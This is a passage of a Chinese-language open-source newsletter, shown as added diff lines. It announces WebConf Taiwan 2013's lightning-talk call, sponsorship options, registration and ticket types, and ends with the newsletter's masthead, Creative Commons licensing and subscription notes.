+請來信至 contact@webconf.tw ，歡迎來與大家一起同樂。
+
+截稿日期為 12/16 (星期日)，並將會在 12/18 (星期二)公布微議程名單。
+
+(如您的講題被 WebConf Taiwan 2013 採用，我們會贈送您 VIP 票一張)
+
+
+WebConf Taiwan 2013 徵求活動贊助 (Open for Sponsorship)
+
+為什麼需要贊助？
+WebConf Taiwan 2013 將於 2013 年 1 月 12 - 13 日 (星期六、日) 於中研院人文社會科學館舉行。
+在兩天的活動期間，預估將有 800 位會眾 (講師、聽眾、工作人員、贊助單位) 參加。我們希望能夠提供優質的服務給會眾，也希望會眾來參與這個聚會的同時可以更為輕鬆愉快；因此，我們需要您的協助，讓我們可以把活動辦得更好。
+
+有什麼好處？
+除了場內精彩的演講之外，我們希望在演講廳外也可以有熱絡的交流，不只是會眾、講師之間的交流，更期望可以藉由這個難得的聚會，讓學習技術、認識朋友、徵才、找工作等。我們歡迎您贊助 WebConf Taiwan 2013，這個聚集開發者、設計師、系統專家、法律顧問、資安顧問、創業家的地方，幫助您自己找到想要的人才、結識您偉大航道上的企業夥伴。
+
+我們會幫貴企業作以下宣傳：
+
+＊我們會贈送固定額度的 VIP 票，歡迎您來共襄盛舉。
+＊在 WebConf Taiwan 2013 網站、大會手冊(會有截稿時限)以及活動休息時間的投影布幕等地方，放上貴公司的企業 Logo，建立企業品牌形象及知名度。
+＊現場攤位與會眾有最直接的互動，除可宣傳貴公司產品、技術外，亦可趁這個難得的機會招募需要的人才。
+＊可以提供 DM 讓我們的會眾自由索取。
+
+我不想透過公司，我想個人贊助！
+我們非常歡迎個人贊助 (NTD $5000)，謝謝您！
+
+＊我們會贈送 VIP 票一張，歡迎您一起來參與這次的盛會。
+＊我們會贈送您本次大會的 T-shirt 一件。
+＊我們會將您的大名/暱稱置放在本次大會網站。
+＊若您願意贊助 WebConf Taiwan 2013，歡迎來信至 contact@webconf.tw ，我們將儘快與您聯繫。
+
+
+WebConf Taiwan 2013 開放報名 (Ready for Registration)
+
+開放報名(一般票)
+WebConf Taiwan 2013 將於 2012 年 12 月 12 日 12 時 12 分 (星期三中午) 開放報名，報名網址：http://registrano.com/events/webconf-taiwan-2013
+
+設計師專用票、學生優待票、VIP 票種說明
+若您是上述身分，您仍可使用一般報名方式來報名 WebConf Taiwan 2013；我們希望能夠讓多元的會眾可以參與，因此設定了多種票種來歡迎、保障有興趣的新朋友。
+
+設計師門票？
+廣邀設計師是 WebConf Taiwan 的重點之一；如果您是設計師，目前亦從事設計師相關工作，您可以填寫這份表單 (https://docs.google.com/spreadsheet/viewform?formkey=dDJYeWp4NTU1dHFIUEJjT3k5RndvaEE6MQ)，若您的資格符合，我們將統一寄送報名序號給您。取得序號後一樣從報名網址進行報名、繳費。
+
+學生票？
+如果您目前仍是學生身份，您可以填寫這份表單 (https://docs.google.com/a/digik.com.tw/spreadsheet/viewform?formkey=dHRzX2JTVnVxXzNnMWxSVnJ6RWpaaUE6MQ)，我們會統一於 12/16 日針對符合資格之名單寄送報名序號至您所填寫的 email (僅限 edu.tw 信箱)，並於 2012 年 12 月 17 日中午 12 時 17 分開放報名。
+
+學生優待票名額僅有 50 名，我們將會挑選前 100 名符合條件之名單寄出序號，取得序號後仍需進行一般的報名程序、繳費，取得序號不代表一定有可報名之名額。
+
+VIP 票？
+VIP 票主要是給講師(包括微議程講者)、贊助廠商以及工作人員的票種。我們很歡迎您來投稿微議程，若您的講題被採用，我們將贈送您免費 VIP 票一張。詳情可參考這篇說明 (http://www.openfoundry.org/call-for-lightning-talks.html)。
+
+相關訊息
+歡迎加入我們的 Facebook 粉絲頁 (https://www.facebook.com/WebConfTaiwan)，或是 follow 我們的 Twitter (https://twitter.com/WebConfTaiwan) 帳號。
+
+當然， 若您願意贊助 WebConf Taiwan 2013，請參考這裡 (http://www.openfoundry.org/open-for-sponsorship.html)，或是直接來信至 contact@webconf.tw ，我們將儘快與您聯繫。
+_______________________________________________________________
+
+
+□ 關於本報 □__________________________________________________
+
+◎ 主編︰洪華超
+◎ 法律專欄編輯︰葛冬梅
+◎ 技術編輯︰曾義峰
+◎ 執行編輯︰王怡凱、林誠夏、林珈宏、陳蕙蓁、彭冠雯
+◎ 外稿編譯︰黃湘婷、黃郁文、蕭惟杰、謝良奇
+
+本電子報自行採訪、報導、編譯、撰寫文章之智慧財產權屬於中央研究院，採用創用 CC「姓名標示－禁止改作－非商業性」授權條款臺灣 3.0 版授權散布，歡迎在不變更內容的前提下，以任何形式重製與散布本報，但必須遵守下列義務︰（1）不得為商業目的之利用；（2）必須標明本電子報智慧財產權屬於中央研究院；（3）完整引用本著作權說明。
+
+若欲以創用 CC「姓名標示－禁止改作－非商業性」授權條款臺灣 3.0 版以外的方式利用上述文章，請與自由軟體鑄造場編輯群（ossfepaper at openfoundry.org）聯絡。
+
+非自由軟體鑄造場自行撰寫的單篇文章，其智慧財產權利屬於原作者所有，其以非專屬的方式授權予自由軟體鑄造場運用，而與本電子報其他文章併以創用 CC「姓名標示－禁止改作－非商業性」授權條款臺灣 3.0 版的方式進行散布。
+
+若欲以創用 CC「姓名標示－禁止改作－非商業性」授權條款臺灣 3.0 版以外的方式利用個別作者的文章，請自行與該作者聯繫，或透過自由軟體鑄造場編輯群（ossfepaper at openfoundry.org）來轉發聯絡訊息。
+
+授權條款全文請見︰
+http://creativecommons.org/licenses/by-sa/3.0/tw/legalcode
+授權條款簡介請見︰
+http://creativecommons.org/licenses/by-sa/3.0/tw/deed.zh_TW
+
+若欲訂閱本電子報，請至以下網址︰
+http://www.openfoundry.org/tw/news
+
+如欲取消訂閱這份電子報，可透過自由軟體鑄造場新聞首頁左上方之自動退訂機制︰
+http://www.openfoundry.org/tw/news
+
+或寄發電子郵件至︰ossfepaper@openfoundry.org，以進行人工退訂。
